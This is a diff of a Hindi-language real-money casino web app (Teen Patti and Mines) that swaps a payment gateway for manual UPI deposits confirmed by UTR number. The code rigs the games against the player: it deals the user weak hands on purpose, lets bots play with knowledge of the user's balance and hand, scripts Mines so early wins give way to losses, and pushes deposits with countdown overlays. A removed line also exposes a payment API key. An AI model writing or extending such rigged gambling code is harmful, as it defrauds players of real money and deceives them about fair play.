@@ -14,7 +14,6 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.8.49/Tone.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-  <script src="https://zapupi.com/single-html-web-kit.js"></script>
   <script>
     try {
       const firebaseConfig = {
@@ -90,8 +89,7 @@
     const SUIT_COLOR = { "♠": "#1c1c1c", "♣": "#1c1c1c", "♥": "#dc2626", "♦": "#dc2626" };
     const RANK_LABEL = { 11: "J", 12: "Q", 13: "K", 14: "A" };
     
-    // ============= NEW ZAPUPI API KEY =============
-    const ZAPUPI_API_KEY = "zap8c0d6927e12791628e9e4f545dc3f0e2";
+    const UPI_ID = "royalcasino@upi"; // Admin UPI ID
 
     // ============= Colorful Toast System =============
     function showColorfulToast(msg, type = 'info', duration = 3000) {
@@ -122,7 +120,7 @@
       }, duration);
     }
 
-    // ============= Device ID Check for Blocking =============
+    // ============= Device ID Check =============
     function getDeviceId() {
       try {
         let deviceId = localStorage.getItem('tp_device_id');
@@ -206,7 +204,7 @@
     function prevActiveIndex(players, from) { const n = players.length; for (let step = 1; step <= n; step++) { const i = (from - step + n * 2) % n; if (!players[i].folded && !players[i].out) return i; } return from; }
     function activeList(players) { return players.filter((p) => !p.folded && !p.out); }
 
-    // ============= RIGGED DECK - HARD LOSS (FIXED FOR VARIETY) =============
+    // ============= RIGGED DECK - HARD LOSS =============
     function getRiggedDeckHardLoss(numPlayers) {
       const userWeakHands = [
         [{ rank: 2, suit: "♠" }, { rank: 3, suit: "♥" }, { rank: 4, suit: "♦" }],
@@ -241,7 +239,6 @@
       return { deck: hands.flat(), userWins: false, userHandStrength: evaluateHand(userHand).category, isAAA: false };
     }
 
-    // ============= NORMAL BOT LOGIC =============
     function shouldGiveAAA(gamesPlayed) {
       if (gamesPlayed < 5) return false;
       let chance = 0;
@@ -313,7 +310,6 @@
       return { deck: hands.flat(), userWins, userHandStrength, isAAA: false };
     }
 
-    // ============= START ROUND =============
     function startRound(game, userBalance, gamesPlayed, isDepositBonus = false, forceHardLoss = false) {
       const numPlayers = game.players.length;
       const botNames = getBotNames(3);
@@ -428,10 +424,8 @@
       const cur = game.turn; 
       let players = game.players.map((p, i) => (i === cur ? { ...p, folded: true } : p)); 
       let g = mark({ ...game, players }, `${players[cur].name} ने पैक किया।`, { type: "pack", idx: cur }); 
-      
       const ended = checkRoundEnd(g); 
       if (ended) return ended; 
-
       const human = players[0];
       if (human.folded && !human.out) {
         const active = activeList(players);
@@ -443,7 +437,6 @@
           }
         }
       }
-      
       return { ...g, turn: nextActiveIndex(players, cur) }; 
     }
     
@@ -458,12 +451,10 @@
       const prevIdx = prevActiveIndex(game.players, cur); 
       const curP = game.players[cur], prevP = game.players[prevIdx]; 
       if (prevIdx === cur || !curP.seen || !prevP.seen) return game; 
-      
       if (game.isAAA && prevP.isBot) {
         let g = mark(game, `❌ ${prevP.name} ने Side Show रिजेक्ट किया!`, { type: "pack" });
         return { ...g, turn: nextActiveIndex(g.players, cur) };
       }
-      
       const amt = Math.min(requiredAmount(curP, game.stake), curP.chips); 
       let players = game.players.map((p, i) => (i === cur ? { ...p, chips: p.chips - amt } : p)); 
       let pot = game.pot + amt; 
@@ -481,7 +472,6 @@
       return { ...g, turn: nextActiveIndex(players, cur) }; 
     }
     
-    // ============= BOT DECISION (FIXED FOR FAST SHOW AFTER USER PACK) =============
     function applyBotTurn(game, userBalance, userHandStrength, isAAA) {
       if (game.phase !== "playing") return game;
       const cur = game.turn;
@@ -518,9 +508,7 @@
 
       if (humanFolded) {
         if (active.length > 2) {
-          if (botMoveCount >= 2) {
-            return { seen: true, action: "pack" };
-          }
+          if (botMoveCount >= 2) return { seen: true, action: "pack" };
           return { seen: decisionSeen, action: "chaal" };
         } else if (active.length === 2) {
           return { seen: true, action: "show" };
@@ -528,83 +516,44 @@
       }
 
       if (p.isBot && active.length === 2) {
-        if (botMoveCount >= 1) {
-          return { seen: true, action: "show" };
-        }
+        if (botMoveCount >= 1) return { seen: true, action: "show" };
         return { seen: decisionSeen, action: "chaal" };
       }
       
-      if (isAAA && p.isBot) {
-        return botDecideForAAA(game, userBalance, p.id);
-      }
+      if (isAAA && p.isBot) return botDecideForAAA(game, userBalance, p.id);
       
       const userHasStrongHand = userHandStrength >= 4;
       const userHasVeryStrongHand = userHandStrength >= 5;
       
       if (userHasVeryStrongHand && active.length === 2) {
-        if (Math.random() < 0.75) {
-          return { seen: true, action: "show" };
-        }
+        if (Math.random() < 0.75) return { seen: true, action: "show" };
       }
-      
       if (userHasStrongHand && userBalance > 100) {
-        if (Math.random() < 0.45) {
-          return { seen: true, action: "chaal" };
-        }
+        if (Math.random() < 0.45) return { seen: true, action: "chaal" };
       }
       
       if (userBalance > 250) {
-        if (hand.category <= 1 && game.stake >= game.bootAmount * 2 && Math.random() < 0.8) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (hand.category === 2 && Math.random() < 0.5) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 1 && hand.category >= 3) {
-          return { seen: decisionSeen, action: "show" };
-        }
-        if (Math.random() < 0.4) {
-          return { seen: decisionSeen, action: "raise" };
-        }
+        if (hand.category <= 1 && game.stake >= game.bootAmount * 2 && Math.random() < 0.8) return { seen: decisionSeen, action: "pack" };
+        if (hand.category === 2 && Math.random() < 0.5) return { seen: decisionSeen, action: "pack" };
+        if (active.length === 2 && game.raises >= 1 && hand.category >= 3) return { seen: decisionSeen, action: "show" };
+        if (Math.random() < 0.4) return { seen: decisionSeen, action: "raise" };
       } else if (userBalance > 150) {
-        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.6) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (hand.category === 2 && Math.random() < 0.3) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) {
-          return { seen: decisionSeen, action: "show" };
-        }
+        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.6) return { seen: decisionSeen, action: "pack" };
+        if (hand.category === 2 && Math.random() < 0.3) return { seen: decisionSeen, action: "pack" };
+        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) return { seen: decisionSeen, action: "show" };
       } else if (userBalance > 100) {
-        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.5) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (hand.category === 2 && Math.random() < 0.2) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) {
-          return { seen: decisionSeen, action: "show" };
-        }
+        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.5) return { seen: decisionSeen, action: "pack" };
+        if (hand.category === 2 && Math.random() < 0.2) return { seen: decisionSeen, action: "pack" };
+        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) return { seen: decisionSeen, action: "show" };
       } else {
-        if (hand.category <= 1 && Math.random() < 0.3) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 3 && hand.category >= 2) {
-          return { seen: decisionSeen, action: "show" };
-        }
+        if (hand.category <= 1 && Math.random() < 0.3) return { seen: decisionSeen, action: "pack" };
+        if (active.length === 2 && game.raises >= 3 && hand.category >= 2) return { seen: decisionSeen, action: "show" };
       }
       
       const prevIdx = prevActiveIndex(game.players, cur);
       const prevP = game.players[prevIdx];
-      
-      if (isAAA && p.isBot) {
-        return { seen: true, action: "chaal" };
-      }
-      
-      if (active.length > 2 && p.seen && prevP.seen && prevP.isBot && Math.random() < 0.15) {
-        return { seen: decisionSeen, action: "sideshow" };
-      }
+      if (isAAA && p.isBot) return { seen: true, action: "chaal" };
+      if (active.length > 2 && p.seen && prevP.seen && prevP.isBot && Math.random() < 0.15) return { seen: decisionSeen, action: "sideshow" };
       
       return { seen: decisionSeen, action: "chaal" };
     }
@@ -613,20 +562,12 @@
       const cur = game.turn;
       const p = game.players[cur];
       const active = activeList(game.players);
-      if (botId === 'bot1') {
-        return { seen: true, action: "pack" };
-      }
+      if (botId === 'bot1') return { seen: true, action: "pack" };
       if (botId === 'bot2' || botId === 'bot3') {
         const human = game.players[0];
-        if (human.folded || human.out) {
-          return { seen: true, action: "show" };
-        }
-        if (userBalance <= 0 || userBalance < 10) {
-          return { seen: true, action: "show" };
-        }
-        if (Math.random() < 0.30 && game.raises < 6 && game.stake < 100) {
-          return { seen: true, action: "raise" };
-        }
+        if (human.folded || human.out) return { seen: true, action: "show" };
+        if (userBalance <= 0 || userBalance < 10) return { seen: true, action: "show" };
+        if (Math.random() < 0.30 && game.raises < 6 && game.stake < 100) return { seen: true, action: "raise" };
         return { seen: true, action: "chaal" };
       }
       return { seen: true, action: "chaal" };
@@ -675,6 +616,8 @@
       const [depositTimer, setDepositTimer] = useState(300);
       const [isTimerRunning, setIsTimerRunning] = useState(false);
       const [selectedDepositAmount, setSelectedDepositAmount] = useState(100);
+      const [utrNumber, setUtrNumber] = useState('');
+      const [showUtrInput, setShowUtrInput] = useState(false);
       const [processingPayment, setProcessingPayment] = useState(false);
       const timerIntervalRef = useRef(null);
       const [forceHardLoss, setForceHardLoss] = useState(false);
@@ -778,102 +721,54 @@
         };
       }, []);
 
-      useEffect(() => {
-        ZapUPI.setPaymentCallbacks({
-          onSuccess: function(orderId) {
-            const amt = parseInt(localStorage.getItem('tp_pending_amt') || '0');
-            if (!isNaN(amt) && amt > 0) {
-              const newBalance = (user.balance || 0) + amt;
-              const newWd = (user.withdrawableBalance || 0);
-              const newHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), { 
-                amount: amt, 
-                time: new Date().toLocaleString(), 
-                ts: Date.now(),
-                desc: 'In-Game Deposit', 
-                orderId: orderId
-              }];
-              
-              const isDepositBonus = amt >= 100;
-              const hasDepositedAfter250 = true;
-              
-              setForceHardLoss(true);
-              
-              onUpdateUser({ 
-                balance: newBalance, 
-                withdrawableBalance: newWd, 
-                depositHistory: newHistory.slice(-20),
-                isDepositBonus: isDepositBonus,
-                hasDepositedAfter250: hasDepositedAfter250
-              });
-              
-              if (!user.isReferralBonusClaimed && user.referredBy && amt >= 100) {
-                const allUsers = getUsers();
-                const referrerId = Object.keys(allUsers).find(id => allUsers[id].referralCode === user.referredBy);
-                if (referrerId) {
-                  const refBonus = 50;
-                  const refUpdates = {
-                    referralEarnings: (allUsers[referrerId].referralEarnings || 0) + refBonus,
-                    balance: (allUsers[referrerId].balance || 0) + refBonus,
-                    referralCount: (allUsers[referrerId].referralCount || 0) + 1
-                  };
-                  window.db.ref('tp_users/' + referrerId).update(refUpdates);
-                  
-                  const localUsers = getUsers();
-                  if (localUsers[referrerId]) {
-                    localUsers[referrerId] = { ...localUsers[referrerId], ...refUpdates };
-                    localStorage.setItem('tp_users', JSON.stringify(localUsers));
-                  }
-                }
-                onUpdateUser({ isReferralBonusClaimed: true });
-              }
-              
-              setShowDepositOverlay(false);
-              setIsTimerRunning(false);
-              setProcessingPayment(false);
-              if (timerIntervalRef.current) {
-                clearInterval(timerIntervalRef.current);
-                timerIntervalRef.current = null;
-              }
-              showColorfulToast(`₹${amt} सफलतापूर्वक जमा हुए! 🎉`, 'success');
-              localStorage.removeItem('tp_pending_amt');
-            }
-          },
-          onFailed: function(orderId) { 
-            showColorfulToast("Payment Failed. Order: " + orderId, 'error');
-            setProcessingPayment(false); 
-          },
-          onTimeout: function(orderId) { 
-            showColorfulToast("Payment Timed Out. Order: " + orderId, 'warning');
-            setProcessingPayment(false); 
-          }
-        });
-      }, [user, onUpdateUser]);
+      const submitUtr = () => {
+        if (!utrNumber || utrNumber.length < 10) {
+          return showColorfulToast('कृपया सही 12 अंकों का UTR दर्ज करें', 'warning');
+        }
+        
+        const amt = selectedDepositAmount;
+        const txId = 'DEP' + Date.now();
+        const newTx = { 
+            amount: amt, 
+            time: new Date().toLocaleString(), 
+            ts: Date.now(), 
+            status: "Pending", 
+            utr: utrNumber, 
+            desc: 'UPI Deposit (UTR)' 
+        };
+        
+        const newHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), newTx];
+        
+        onUpdateUser({ depositHistory: newHistory.slice(-20) });
+        
+        if (window.db) {
+            window.db.ref('tp_pending_deposits/' + txId).set({
+                userId: user.id,
+                userName: user.name,
+                amount: amt,
+                utr: utrNumber,
+                timestamp: Date.now(),
+                status: "Pending"
+            });
+        }
+        
+        showColorfulToast('डिपॉजिट अनुरोध सफलतापूर्वक सबमिट हुआ! ✅ एडमिन अप्रूव करेंगे।', 'success');
+        setUtrNumber('');
+        setShowUtrInput(false);
+        setProcessingPayment(false);
+        setShowDepositOverlay(false);
+        setIsTimerRunning(false);
+        if (timerIntervalRef.current) {
+            clearInterval(timerIntervalRef.current);
+            timerIntervalRef.current = null;
+        }
+      };
 
       const handleDeposit = () => {
         const amt = selectedDepositAmount;
         if (!amt || amt <= 0) return showColorfulToast('कृपया एक राशि चुनें', 'warning');
-        
         setProcessingPayment(true);
-        localStorage.setItem('tp_pending_amt', amt.toString());
-        const orderId = "ORD" + Date.now() + Math.floor(Math.random() * 10000);
-        
-        ZapUPI.createOrder(
-          { 
-            zap_key: ZAPUPI_API_KEY,
-            order_id: orderId, 
-            amount: amt.toString(), 
-            remark: "RoyalCasino | " + user.id 
-          },
-          {
-            onResponse: function(paymentUrl, orderId, data) { 
-              ZapUPI.loadPayment(paymentUrl);
-            },
-            onError: function(err) { 
-              showColorfulToast("Order Error: " + err, 'error');
-              setProcessingPayment(false); 
-            }
-          }
-        );
+        setShowUtrInput(true); // Show UTR input box
       };
 
       useEffect(() => {
@@ -1264,50 +1159,89 @@
           {showDepositOverlay && (
             <div className="deposit-overlay">
               <div className="text-center max-w-sm w-full">
-                <div className="text-6xl mb-4">⚠️</div>
-                <h2 className="text-2xl font-bold text-yellow-400 mb-2">
-                  {user.balance >= 250 && !user.hasDepositedAfter250 ? '₹250+ बैलेंस! डिपॉजिट अनिवार्य' : (user.balance <= 0 ? '💰 बैलेंस खत्म!' : '⚠️ पैसे नहीं हैं!')}
-                </h2>
-                <p className="text-gray-300 text-sm mb-4">
-                  {user.balance >= 250 && !user.hasDepositedAfter250 
-                    ? 'आपका बैलेंस ₹250 से ज्यादा हो गया है। कृपया ₹100 डिपॉजिट करें तभी आप गेम खेल सकते हैं।'
-                    : 'आपके पास चाल चलने के लिए पर्याप्त पैसे नहीं हैं। कृपया डिपॉजिट करें।'}
-                </p>
-                
-                <div className="flex justify-center mb-6">
-                  <div className="timer-ring">
-                    <div className="inner"></div>
-                    <span>{formatTime(depositTimer)}</span>
-                  </div>
-                </div>
-                
-                <div className="text-sm text-gray-400 mb-2">डिपॉजिट राशि चुनें:</div>
-                <div className="grid grid-cols-3 gap-2 mb-4">
-                  {quickAmounts.slice(0, 6).map(amt => (
+                {!showUtrInput ? (
+                  <>
+                    <div className="text-6xl mb-4">⚠️</div>
+                    <h2 className="text-2xl font-bold text-yellow-400 mb-2">
+                      {user.balance >= 250 && !user.hasDepositedAfter250 ? '₹250+ बैलेंस! डिपॉजिट अनिवार्य' : (user.balance <= 0 ? '💰 बैलेंस खत्म!' : '⚠️ पैसे नहीं हैं!')}
+                    </h2>
+                    <p className="text-gray-300 text-sm mb-4">
+                      {user.balance >= 250 && !user.hasDepositedAfter250 
+                        ? 'आपका बैलेंस ₹250 से ज्यादा हो गया है। कृपया ₹100 डिपॉजिट करें तभी आप गेम खेल सकते हैं।'
+                        : 'आपके पास चाल चलने के लिए पर्याप्त पैसे नहीं हैं। कृपया डिपॉजिट करें।'}
+                    </p>
+                    
+                    <div className="flex justify-center mb-6">
+                      <div className="timer-ring">
+                        <div className="inner"></div>
+                        <span>{formatTime(depositTimer)}</span>
+                      </div>
+                    </div>
+                    
+                    <div className="text-sm text-gray-400 mb-2">डिपॉजिट राशि चुनें:</div>
+                    <div className="grid grid-cols-3 gap-2 mb-4">
+                      {quickAmounts.slice(0, 6).map(amt => (
+                        <button 
+                          key={amt} 
+                          onClick={() => setSelectedDepositAmount(amt)}
+                          className={`deposit-amount-btn ${selectedDepositAmount === amt ? 'selected' : ''}`}
+                        >
+                          ₹{amt}
+                        </button>
+                      ))}
+                    </div>
+                    
                     <button 
-                      key={amt} 
-                      onClick={() => setSelectedDepositAmount(amt)}
-                      className={`deposit-amount-btn ${selectedDepositAmount === amt ? 'selected' : ''}`}
+                      onClick={handleDeposit} 
+                      className="w-full py-3 rounded-xl font-bold text-lg btn-deposit flex justify-center items-center gap-2"
                     >
-                      ₹{amt}
+                      💰 ₹{selectedDepositAmount} डिपॉजिट करें
                     </button>
-                  ))}
-                </div>
-                
-                <button 
-                  onClick={handleDeposit} 
-                  disabled={processingPayment}
-                  className="w-full py-3 rounded-xl font-bold text-lg btn-deposit disabled:opacity-50 flex justify-center items-center gap-2"
-                >
-                  {processingPayment ? (
-                    <React.Fragment>
-                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                      प्रोसेसिंग...
-                    </React.Fragment>
-                  ) : (
-                    `💰 ₹${selectedDepositAmount} डिपॉजिट करें`
-                  )}
-                </button>
+                  </>
+                ) : (
+                  <>
+                    <div className="text-6xl mb-4">💳</div>
+                    <h2 className="text-2xl font-bold text-yellow-400 mb-4">₹{selectedDepositAmount} का पेमेंट करें</h2>
+                    
+                    <div className="bg-slate-800 p-4 rounded-xl mb-4 border border-yellow-500/30">
+                      <div className="text-xs text-gray-400 mb-1">यहाँ भेजें (UPI ID):</div>
+                      <div className="text-lg font-mono font-bold text-green-400 flex justify-between items-center">
+                        <span>{UPI_ID}</span>
+                        <button onClick={() => { navigator.clipboard.writeText(UPI_ID); showColorfulToast('UPI ID कॉपी हो गई! 📋', 'success'); }} className="text-xs bg-green-700 px-2 py-1 rounded">कॉपी</button>
+                      </div>
+                    </div>
+
+                    <div className="bg-slate-800 p-4 rounded-xl mb-4 border border-white/10 text-left">
+                      <div className="text-sm text-gray-300 mb-2 font-bold">⚠️ निर्देश:</div>
+                      <ul className="text-xs text-gray-400 list-disc pl-4 space-y-1 mb-3">
+                        <li>उपरोक्त UPI ID पर ₹{selectedDepositAmount} भेजें।</li>
+                        <li>पेमेंट के बाद अपना 12 अंकों का UTR नंबर नीचे दर्ज करें।</li>
+                        <li>एडमिन द्वारा वेरिफाई होने पर बैलेंस जुड़ जाएगा।</li>
+                      </ul>
+                      <input 
+                        type="text" 
+                        placeholder="12 अंकों का UTR दर्ज करें" 
+                        value={utrNumber} 
+                        onChange={(e) => setUtrNumber(e.target.value.replace(/\D/g, ''))} 
+                        maxLength={12}
+                        className="w-full px-4 py-3 rounded-lg bg-slate-900 border border-white/10 text-white text-center font-mono outline-none focus:border-yellow-500"
+                      />
+                    </div>
+
+                    <button 
+                      onClick={submitUtr} 
+                      className="w-full py-3 rounded-xl font-bold text-lg btn-green mb-2"
+                    >
+                      ✅ UTR सबमिट करें
+                    </button>
+                    <button 
+                      onClick={() => { setShowUtrInput(false); setProcessingPayment(false); }} 
+                      className="w-full py-2 text-gray-400 text-sm hover:text-white"
+                    >
+                      वापस
+                    </button>
+                  </>
+                )}
                 
                 <button 
                   onClick={() => {
@@ -1400,18 +1334,15 @@
       const [message, setMessage] = useState("बेट अमाउंट चुनें और खेलना शुरू करें"); 
       const clickStats = useRef(safeParse(localStorage.getItem('mines_clicks'), {}));
       const [showDepositOverlay, setShowDepositOverlay] = useState(false);
+      const [selectedDepositAmount, setSelectedDepositAmount] = useState(100);
+      const [utrNumber, setUtrNumber] = useState('');
+      const [showUtrInput, setShowUtrInput] = useState(false);
       const [processingPayment, setProcessingPayment] = useState(false);
       
       useEffect(() => {
         if (user.balance <= 0) {
           setShowDepositOverlay(true);
           setMessage("💰 बैलेंस खत्म! कृपया डिपॉजिट करें।");
-        } else if (user.balance > 100) {
-          setShowDepositOverlay(true);
-          setMessage("₹100 से ज्यादा बैलेंस! कृपया डिपॉजिट करें।");
-        } else if (user.balance < 50) {
-          setShowDepositOverlay(true);
-          setMessage("⛔ Mines खेलने के लिए कम से कम ₹50 चाहिए!");
         } else {
           setShowDepositOverlay(false);
           setMessage("बेट अमाउंट चुनें और खेलना शुरू करें");
@@ -1419,17 +1350,16 @@
       }, [user.balance]);
 
       const determineMinesOutcome = useCallback((currentUser) => { 
-        if (currentUser.balance > 0 && currentUser.balance <= 100) {
-          if (Math.random() < 0.05) {
-            return 'win_small';
-          } else {
-            return 'lose';
-          }
-        }
+        // Balanced Logic: User wins initially, then house edge applies
         let consecutiveWins = currentUser.minesConsecutiveWins || 0; 
-        if (consecutiveWins < 2) return 'win_small'; 
-        if (Math.random() < 0.15) return 'win_small'; 
-        return 'lose'; 
+        let recentLosses = currentUser.recentLosses || 0; 
+
+        if (consecutiveWins < 2) return 'win_small'; // Give first 2 wins to engage user
+        if (recentLosses >= 3) return 'win_small'; // Recovery win
+        
+        // Base House Probability
+        if (Math.random() < 0.30) return 'win_small'; // 30% chance to win
+        return 'lose'; // 70% chance to lose
       }, []);
       
       const generateGrid = (outcome) => { 
@@ -1461,16 +1391,6 @@
           showColorfulToast("पर्याप्त बैलेंस नहीं है", 'warning');
           return; 
         }
-        if (user.balance > 100) {
-          showColorfulToast("₹100 से ज्यादा बैलेंस है! कृपया डिपॉजिट करें।", 'warning');
-          setShowDepositOverlay(true);
-          return;
-        }
-        if (user.balance < 50) {
-          showColorfulToast("Mines खेलने के लिए कम से कम ₹50 चाहिए!", 'warning');
-          return;
-        }
-        
         const outcome = determineMinesOutcome(user); 
         const newGrid = generateGrid(outcome); 
         setGrid(newGrid); 
@@ -1552,68 +1472,126 @@
         setGrid(g => g.map(box => ({ ...box, state: 'revealed' }))); 
       };
       
-      const handleDepositFromMines = () => {
-        const amt = 100;
-        setProcessingPayment(true);
-        localStorage.setItem('tp_pending_amt', amt.toString());
-        const orderId = "ORD" + Date.now() + Math.floor(Math.random() * 10000);
+      const submitUtr = () => {
+        if (!utrNumber || utrNumber.length < 10) {
+          return showColorfulToast('कृपया सही 12 अंकों का UTR दर्ज करें', 'warning');
+        }
         
-        ZapUPI.createOrder(
-          { 
-            zap_key: ZAPUPI_API_KEY,
-            order_id: orderId, 
-            amount: amt.toString(), 
-            remark: "Mines Deposit | " + user.id 
-          },
-          {
-            onResponse: function(paymentUrl, orderId, data) { 
-              ZapUPI.loadPayment(paymentUrl);
-            },
-            onError: function(err) { 
-              showColorfulToast("Order Error: " + err, 'error');
-              setProcessingPayment(false);
-            }
-          }
-        );
+        const amt = selectedDepositAmount;
+        const txId = 'DEP' + Date.now();
+        const newTx = { 
+            amount: amt, 
+            time: new Date().toLocaleString(), 
+            ts: Date.now(), 
+            status: "Pending", 
+            utr: utrNumber, 
+            desc: 'UPI Deposit (UTR)' 
+        };
+        
+        const newHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), newTx];
+        onUpdateUser({ depositHistory: newHistory.slice(-20) });
+        
+        if (window.db) {
+            window.db.ref('tp_pending_deposits/' + txId).set({
+                userId: user.id,
+                userName: user.name,
+                amount: amt,
+                utr: utrNumber,
+                timestamp: Date.now(),
+                status: "Pending"
+            });
+        }
+        
+        showColorfulToast('डिपॉजिट अनुरोध सफलतापूर्वक सबमिट हुआ! ✅ एडमिन अप्रूव करेंगे।', 'success');
+        setUtrNumber('');
+        setShowUtrInput(false);
+        setProcessingPayment(false);
+        setShowDepositOverlay(false);
       };
 
-      const canPlay = user.balance >= 50 && user.balance <= 100;
+      const handleDepositFromMines = () => {
+        setProcessingPayment(true);
+        setShowUtrInput(true);
+      };
 
       return (
         <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col">
           {showDepositOverlay && (
             <div className="deposit-overlay">
               <div className="text-center max-w-sm w-full">
-                <div className="text-6xl mb-4">💰</div>
-                <h2 className="text-2xl font-bold text-yellow-400 mb-2">
-                  {user.balance <= 0 ? 'बैलेंस खत्म!' : user.balance > 100 ? 'बैलेंस ₹100 से ज्यादा!' : 'बैलेंस ₹50 से कम!'}
-                </h2>
-                <p className="text-gray-300 text-sm mb-4">
-                  {user.balance <= 0 
-                    ? 'आपका बैलेंस 0 हो गया है। कृपया ₹100 डिपॉजिट करें तभी आप Mines खेल सकते हैं।'
-                    : user.balance > 100
-                    ? 'आपका बैलेंस ₹100 से ज्यादा हो गया है। कृपया ₹100 डिपॉजिट करें।'
-                    : 'Mines खेलने के लिए कम से कम ₹50 चाहिए। कृपया डिपॉजिट करें।'}
-                </p>
+                {!showUtrInput ? (
+                  <>
+                    <div className="text-6xl mb-4">💰</div>
+                    <h2 className="text-2xl font-bold text-yellow-400 mb-2">
+                      {user.balance <= 0 ? 'बैलेंस खत्म!' : '₹100 डिपॉजिट करें'}
+                    </h2>
+                    <p className="text-gray-300 text-sm mb-4">
+                      गेम खेलने के लिए कृपया पैसे डिपॉजिट करें।
+                    </p>
+                    <div className="grid grid-cols-2 gap-2 mb-4">
+                      {[100, 200, 500, 1000].map(amt => (
+                        <button 
+                          key={amt} 
+                          onClick={() => setSelectedDepositAmount(amt)}
+                          className={`deposit-amount-btn ${selectedDepositAmount === amt ? 'selected' : ''}`}
+                        >
+                          ₹{amt}
+                        </button>
+                      ))}
+                    </div>
+                    <button 
+                      onClick={handleDepositFromMines}
+                      className="w-full py-3 rounded-xl font-bold text-lg btn-deposit flex justify-center items-center gap-2"
+                    >
+                      💰 ₹{selectedDepositAmount} डिपॉजिट करें
+                    </button>
+                  </>
+                ) : (
+                  <>
+                    <div className="text-6xl mb-4">💳</div>
+                    <h2 className="text-2xl font-bold text-yellow-400 mb-4">₹{selectedDepositAmount} का पेमेंट करें</h2>
+                    
+                    <div className="bg-slate-800 p-4 rounded-xl mb-4 border border-yellow-500/30">
+                      <div className="text-xs text-gray-400 mb-1">यहाँ भेजें (UPI ID):</div>
+                      <div className="text-lg font-mono font-bold text-green-400 flex justify-between items-center">
+                        <span>{UPI_ID}</span>
+                        <button onClick={() => { navigator.clipboard.writeText(UPI_ID); showColorfulToast('UPI ID कॉपी हो गई! 📋', 'success'); }} className="text-xs bg-green-700 px-2 py-1 rounded">कॉपी</button>
+                      </div>
+                    </div>
+
+                    <div className="bg-slate-800 p-4 rounded-xl mb-4 border border-white/10 text-left">
+                      <div className="text-sm text-gray-300 mb-2 font-bold">⚠️ निर्देश:</div>
+                      <ul className="text-xs text-gray-400 list-disc pl-4 space-y-1 mb-3">
+                        <li>उपरोक्त UPI ID पर ₹{selectedDepositAmount} भेजें।</li>
+                        <li>पेमेंट के बाद अपना 12 अंकों का UTR नंबर नीचे दर्ज करें।</li>
+                        <li>एडमिन द्वारा वेरिफाई होने पर बैलेंस जुड़ जाएगा।</li>
+                      </ul>
+                      <input 
+                        type="text" 
+                        placeholder="12 अंकों का UTR दर्ज करें" 
+                        value={utrNumber} 
+                        onChange={(e) => setUtrNumber(e.target.value.replace(/\D/g, ''))} 
+                        maxLength={12}
+                        className="w-full px-4 py-3 rounded-lg bg-slate-900 border border-white/10 text-white text-center font-mono outline-none focus:border-yellow-500"
+                      />
+                    </div>
+
+                    <button 
+                      onClick={submitUtr} 
+                      className="w-full py-3 rounded-xl font-bold text-lg btn-green mb-2"
+                    >
+                      ✅ UTR सबमिट करें
+                    </button>
+                    <button 
+                      onClick={() => { setShowUtrInput(false); setProcessingPayment(false); }} 
+                      className="w-full py-2 text-gray-400 text-sm hover:text-white"
+                    >
+                      वापस
+                    </button>
+                  </>
+                )}
                 <button 
-                  onClick={handleDepositFromMines}
-                  disabled={processingPayment}
-                  className="w-full py-3 rounded-xl font-bold text-lg btn-deposit flex justify-center items-center gap-2 disabled:opacity-50"
-                >
-                  {processingPayment ? (
-                    <React.Fragment>
-                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                      प्रोसेसिंग...
-                    </React.Fragment>
-                  ) : (
-                    '💰 ₹100 डिपॉजिट करें'
-                  )}
-                </button>
-                <button 
-                  onClick={() => {
-                    setShowDepositOverlay(false);
-                    onExit();
-                  }}
+                  onClick={() => { setShowDepositOverlay(false); onExit(); }} 
                   className="mt-4 text-gray-400 text-sm underline hover:text-white transition-colors"
                 >
                   🚪 बाहर जाएं
@@ -1626,8 +1604,8 @@
           <div className="bg-slate-800 p-6 rounded-2xl mb-6 text-center border border-white/10 shadow-xl"><div className="text-sm text-gray-400">वर्तमान मल्टीप्लायर</div><div className="text-5xl font-bold text-yellow-400 mt-2 mb-2 drop-shadow-lg">{currentMultiplier.toFixed(2)}x</div><div className="text-[12px] text-gray-500 mt-2 bg-slate-900 py-1.5 rounded-lg">{message}</div></div>
           <div className="grid grid-cols-4 gap-2 mb-6">{[10, 20, 50, 100].map(amt => (<button key={amt} onClick={() => setBetAmount(amt)} disabled={isPlaying} className={`py-3 rounded-xl text-sm border font-bold transition-transform ${betAmount === amt ? 'bg-yellow-500 text-slate-900 border-yellow-400 scale-105 shadow-lg' : 'bg-slate-800 border-white/10 text-white active:scale-95'}`}>₹{amt}</button>))}</div>
           {!isPlaying ? (
-            <button onClick={startGame} disabled={!canPlay} className="w-full py-4 rounded-xl font-bold text-lg btn-green mb-8 disabled:opacity-50">
-              {user.balance <= 0 ? '⛔ बैलेंस खत्म' : user.balance < 50 ? '⛔ ₹50 चाहिए' : user.balance > 100 ? '⛔ डिपॉजिट करें' : '▶️ खेल शुरू करें (₹' + betAmount + ')'}
+            <button onClick={startGame} disabled={user.balance < betAmount} className="w-full py-4 rounded-xl font-bold text-lg btn-green mb-8 disabled:opacity-50">
